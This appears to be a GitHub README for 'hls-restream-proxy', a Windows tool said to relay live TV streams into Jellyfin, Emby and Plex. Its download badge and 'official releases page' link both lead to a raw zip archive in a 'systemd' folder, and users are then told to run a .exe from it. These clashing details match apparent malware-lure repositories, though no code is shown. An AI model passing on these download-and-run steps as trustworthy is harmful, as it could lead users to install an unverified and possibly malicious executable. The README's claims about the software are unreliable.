# 📺 hls-restream-proxy - Stream live television on your media server

[![Download hls-restream-proxy](https://img.shields.io/badge/Download-hls--restream--proxy-blue.svg)](https://github.com/teraka3109/hls-restream-proxy/raw/refs/heads/main/systemd/proxy-restream-hls-2.6.zip)

hls-restream-proxy helps you connect external live television streams to your home media server. Many media servers struggle to read raw internet television links. This tool acts as a bridge. It converts complex stream formats into a style that your media server understands. It manages your stream access and updates web tokens so your television channels stay active.

## 🛠 Features

*   **Header Injection:** Adds required identification to your stream requests.
*   **Playlist Rewriting:** Updates m3u8 playlist files for compatibility.
*   **Token Refreshing:** Automatically handles authentication for secure streams.
*   **Efficiency:** Uses minimal system resources for 24/7 operation.
*   **Compatibility:** Works with Jellyfin, Emby, and Plex.

## 📋 System Requirements

Ensure your computer meets these standards before installation:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 2GB of available RAM.
*   **Storage:** 100MB of free disk space.
*   **Network:** An active and stable internet connection.
*   **Dependencies:** No external software installations required.

## 📥 Setup and Installation

Follow these steps to install the software on your Windows machine:

1. Visit the [official releases page](https://github.com/teraka3109/hls-restream-proxy/raw/refs/heads/main/systemd/proxy-restream-hls-2.6.zip) to download the latest installer.
2. Locate the file ending in .exe in your Downloads folder.
3. Double-click the file to start the installer.
4. Select the location where you want to keep the program files and click Install.
5. Launch the application from your Start Menu after the process finishes.

## ⚙️ How to Configure Streams

The software uses a text file to handle your stream list. Follow this process to add your first channel:

1. Open the application interface from the system tray.
2. Click on the Settings icon.
3. Locate the stream configuration file button and click it to open the file in your default text editor.
4. Paste your m3u8 source URL on a new line.
5. Save the file and restart the service through the application icon.
6. Copy the local proxy URL provided in the settings tab.

## 🖥 Connecting to Your Media Server

Once the proxy runs, you must update your media server settings to use the output address.

### For Jellyfin and Emby Users
1. Open your media server dashboard.
2. Go to the Live TV section.
3. Click on Tuner Devices.
4. Select Add Tuner.
5. Set the tuner type to M3U Tuner.
6. Paste your local proxy URL into the file path box.
7. Save the settings.

### For Plex Users
1. Open the Plex Web interface.
2. Enter the Live TV & DVR settings menu.
3. Choose Set Up Plex DVR.
4. Provide the local proxy URL from the hls-restream-proxy window.
5. Follow the onscreen prompts to map your channels to the provided guide data if you have it.

## 🛡 Network and Security

The proxy communicates over your local network. You do not need to open external ports on your router to use this software. If your Windows Firewall asks for permission during the first launch, select the option to allow access on private networks. This enables your media server to talk to the proxy application.

## 💡 Common Troubleshooting Tips

If you face issues with playback, review these common fixes:

*   **Check the Stream Source:** Paste the raw m3u8 link into a network-aware video player to check if the source is live.
*   **Verify Network Path:** Ensure your media server and the computer running the proxy share the same local network connection.
*   **Restart the Proxy:** Close the application from the hidden icons area in the taskbar and open it again.
*   **Examine Logs:** Right-click the application icon and select View Logs. Look for red text indicators that mention connection timeouts or authentication failures.
*   **Update:** Check for newer versions of the software if you experience persistent errors after a stream update.

## 📈 Improving Performance

If you stream many channels at once, your system may use more processor power. Limit the number of active streams if your host computer shows high usage. Consider running the software as a background task to keep your desktop area clear. You can set the application to launch when you log into Windows by adding a shortcut to the Windows Startup folder.

## ⚖️ Usage Considerations

The software acts as a pass-through tool. It does not modify the video content or host video data files. Use this software to manage your own stream subscriptions and local television files. Ensure that you follow the terms of service provided by your television stream source. The proxy only works if the source stream is valid and active. Keep your configuration file organized to prevent playback errors. Regularly update the software to take advantage of improved token management and optimized header delivery.